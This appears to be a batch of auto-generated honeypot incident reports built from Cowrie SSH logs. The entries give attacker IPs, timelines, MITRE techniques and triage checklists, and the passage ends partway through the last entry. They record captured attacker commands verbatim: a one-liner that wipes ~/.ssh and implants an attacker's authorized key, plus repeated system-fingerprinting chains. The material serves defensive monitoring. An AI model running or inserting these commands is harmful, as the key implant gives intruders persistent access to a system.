### 🔴 HIGH · IR-71d2e0924388

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-13 04:55 |
| **Last Seen** | 2026-07-13 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:55:15` | `cowrie.session.connect` |
| `2026-07-13 04:55:15` | `cowrie.client.version` |
| `2026-07-13 04:55:15` | `cowrie.client.kex` |
| `2026-07-13 04:55:16` | `cowrie.login.success` |
| `2026-07-13 04:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b90ab0139399

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 04:56 |
| **Last Seen** | 2026-07-13 04:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:56:18` | `cowrie.session.connect` |
| `2026-07-13 04:56:19` | `cowrie.client.version` |
| `2026-07-13 04:56:19` | `cowrie.client.kex` |
| `2026-07-13 04:56:21` | `cowrie.login.success` |
| `2026-07-13 04:56:22` | `cowrie.session.params` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.success` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:22` | `cowrie.command.input` |
| `2026-07-13 04:56:23` | `cowrie.log.closed` |
| `2026-07-13 04:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85965d70a18e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.40[.]97` |
| **First Seen** | 2026-07-13 04:56 |
| **Last Seen** | 2026-07-13 04:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:56:59` | `cowrie.session.connect` |
| `2026-07-13 04:56:59` | `cowrie.client.version` |
| `2026-07-13 04:57:00` | `cowrie.client.kex` |
| `2026-07-13 04:57:00` | `cowrie.login.success` |
| `2026-07-13 04:57:02` | `cowrie.session.params` |
| `2026-07-13 04:57:02` | `cowrie.command.input` |
| `2026-07-13 04:57:02` | `cowrie.command.failed` |
| `2026-07-13 04:57:02` | `cowrie.log.closed` |
| `2026-07-13 04:57:03` | `cowrie.session.params` |
| `2026-07-13 04:57:03` | `cowrie.command.input` |
| `2026-07-13 04:57:03` | `cowrie.session.file_download` |
| `2026-07-13 04:57:03` | `cowrie.log.closed` |
| `2026-07-13 04:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.40[.]97` to AbuseIPDB if not already reported
- [ ] Block `165.154.40[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1793b0eaf7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.40[.]97` |
| **First Seen** | 2026-07-13 04:57 |
| **Last Seen** | 2026-07-13 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:57:03` | `cowrie.session.connect` |
| `2026-07-13 04:57:03` | `cowrie.client.version` |
| `2026-07-13 04:57:04` | `cowrie.client.kex` |
| `2026-07-13 04:57:04` | `cowrie.login.success` |
| `2026-07-13 04:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.40[.]97` to AbuseIPDB if not already reported
- [ ] Block `165.154.40[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f6767e8602

| Field | Detail |
|---|---|
| **Source IP** | `165.154.40[.]97` |
| **First Seen** | 2026-07-13 04:57 |
| **Last Seen** | 2026-07-13 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:57:05` | `cowrie.session.connect` |
| `2026-07-13 04:57:05` | `cowrie.client.version` |
| `2026-07-13 04:57:05` | `cowrie.client.kex` |
| `2026-07-13 04:57:06` | `cowrie.login.success` |
| `2026-07-13 04:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.40[.]97` to AbuseIPDB if not already reported
- [ ] Block `165.154.40[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a15aefa18c5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 04:58 |
| **Last Seen** | 2026-07-13 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:58:27` | `cowrie.session.connect` |
| `2026-07-13 04:58:27` | `cowrie.client.version` |
| `2026-07-13 04:58:27` | `cowrie.client.kex` |
| `2026-07-13 04:58:29` | `cowrie.login.success` |
| `2026-07-13 04:58:30` | `cowrie.session.params` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.success` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:30` | `cowrie.command.input` |
| `2026-07-13 04:58:31` | `cowrie.log.closed` |
| `2026-07-13 04:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9f7c19fb62

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 05:00 |
| **Last Seen** | 2026-07-13 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:00:24` | `cowrie.session.connect` |
| `2026-07-13 05:00:24` | `cowrie.client.version` |
| `2026-07-13 05:00:24` | `cowrie.client.kex` |
| `2026-07-13 05:00:25` | `cowrie.login.success` |
| `2026-07-13 05:00:26` | `cowrie.session.params` |
| `2026-07-13 05:00:26` | `cowrie.command.input` |
| `2026-07-13 05:00:26` | `cowrie.log.closed` |
| `2026-07-13 05:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4456b78b69e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:00 |
| **Last Seen** | 2026-07-13 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:00:35` | `cowrie.session.connect` |
| `2026-07-13 05:00:36` | `cowrie.client.version` |
| `2026-07-13 05:00:36` | `cowrie.client.kex` |
| `2026-07-13 05:00:37` | `cowrie.login.success` |
| `2026-07-13 05:00:39` | `cowrie.session.params` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.success` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.command.input` |
| `2026-07-13 05:00:39` | `cowrie.log.closed` |
| `2026-07-13 05:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3782580202e8

| Field | Detail |
|---|---|
| **Source IP** | `59.8.66[.]225` |
| **First Seen** | 2026-07-13 05:03 |
| **Last Seen** | 2026-07-13 05:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:03:55` | `cowrie.session.connect` |
| `2026-07-13 05:03:56` | `cowrie.client.version` |
| `2026-07-13 05:03:56` | `cowrie.client.kex` |
| `2026-07-13 05:03:58` | `cowrie.login.success` |
| `2026-07-13 05:03:59` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.8.66[.]225` to AbuseIPDB if not already reported
- [ ] Block `59.8.66[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39679fd82c21

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:04 |
| **Last Seen** | 2026-07-13 05:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:04:44` | `cowrie.session.connect` |
| `2026-07-13 05:04:44` | `cowrie.client.version` |
| `2026-07-13 05:04:44` | `cowrie.client.kex` |
| `2026-07-13 05:04:47` | `cowrie.login.success` |
| `2026-07-13 05:04:48` | `cowrie.session.params` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.success` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:48` | `cowrie.command.input` |
| `2026-07-13 05:04:49` | `cowrie.log.closed` |
| `2026-07-13 05:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67cb54c5c305

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:06 |
| **Last Seen** | 2026-07-13 05:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:06:48` | `cowrie.session.connect` |
| `2026-07-13 05:06:48` | `cowrie.client.version` |
| `2026-07-13 05:06:48` | `cowrie.client.kex` |
| `2026-07-13 05:06:50` | `cowrie.login.success` |
| `2026-07-13 05:06:52` | `cowrie.session.params` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.success` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.command.input` |
| `2026-07-13 05:06:52` | `cowrie.log.closed` |
| `2026-07-13 05:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4987a5b1e85c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-07-13 05:07 |
| **Last Seen** | 2026-07-13 05:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:07:30` | `cowrie.session.connect` |
| `2026-07-13 05:07:30` | `cowrie.client.version` |
| `2026-07-13 05:07:30` | `cowrie.client.kex` |
| `2026-07-13 05:07:31` | `cowrie.login.success` |
| `2026-07-13 05:07:32` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8222d64d6791

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-07-13 05:07 |
| **Last Seen** | 2026-07-13 05:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:07:37` | `cowrie.session.connect` |
| `2026-07-13 05:07:37` | `cowrie.client.version` |
| `2026-07-13 05:07:37` | `cowrie.client.kex` |
| `2026-07-13 05:07:38` | `cowrie.login.success` |
| `2026-07-13 05:07:39` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e07f92748fb6

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-13 05:07 |
| **Last Seen** | 2026-07-13 05:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:07:56` | `cowrie.session.connect` |
| `2026-07-13 05:07:57` | `cowrie.client.version` |
| `2026-07-13 05:07:57` | `cowrie.client.kex` |
| `2026-07-13 05:07:59` | `cowrie.login.success` |
| `2026-07-13 05:07:59` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b51ee2d0633

| Field | Detail |
|---|---|
| **Source IP** | `182.53.55[.]252` |
| **First Seen** | 2026-07-13 05:08 |
| **Last Seen** | 2026-07-13 05:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:08:05` | `cowrie.session.connect` |
| `2026-07-13 05:08:05` | `cowrie.client.version` |
| `2026-07-13 05:08:05` | `cowrie.client.kex` |
| `2026-07-13 05:08:07` | `cowrie.login.success` |
| `2026-07-13 05:08:08` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.55[.]252` to AbuseIPDB if not already reported
- [ ] Block `182.53.55[.]252` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198ae37b80ee

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:08 |
| **Last Seen** | 2026-07-13 05:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:08:41` | `cowrie.session.connect` |
| `2026-07-13 05:08:42` | `cowrie.client.version` |
| `2026-07-13 05:08:42` | `cowrie.client.kex` |
| `2026-07-13 05:08:43` | `cowrie.login.success` |
| `2026-07-13 05:08:45` | `cowrie.session.params` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.success` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.command.input` |
| `2026-07-13 05:08:45` | `cowrie.log.closed` |
| `2026-07-13 05:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8aae3b25d67

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:10 |
| **Last Seen** | 2026-07-13 05:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:10:43` | `cowrie.session.connect` |
| `2026-07-13 05:10:44` | `cowrie.client.version` |
| `2026-07-13 05:10:44` | `cowrie.client.kex` |
| `2026-07-13 05:10:45` | `cowrie.login.success` |
| `2026-07-13 05:10:47` | `cowrie.session.params` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.success` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:47` | `cowrie.command.input` |
| `2026-07-13 05:10:48` | `cowrie.log.closed` |
| `2026-07-13 05:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e38d3faf2ae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:12 |
| **Last Seen** | 2026-07-13 05:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
